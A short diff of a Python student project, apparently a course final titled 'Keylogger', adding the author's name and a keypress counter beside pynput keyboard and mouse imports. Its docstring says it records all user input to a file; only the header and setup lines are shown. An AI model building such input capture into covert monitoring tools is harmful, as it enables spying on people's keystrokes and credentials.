@@ -1,4 +1,6 @@
-""" CIS-30A Summer 2025
+""" 
+Sadia Plimley
+CIS-30A Summer 2025
 Final Project: Keylogger
 Program Purpose: To monitor all user inputs on their device
 and track them in a file. Additionally, organize the data to show statistics
@@ -11,6 +13,7 @@ from pynput.mouse import Controller
 from pynput.keyboard import Listener
 import random 
 
+key_press_count = 0
 
 def ctrl_mouse(): # function moves user's mouse 
     mouse = Controller()
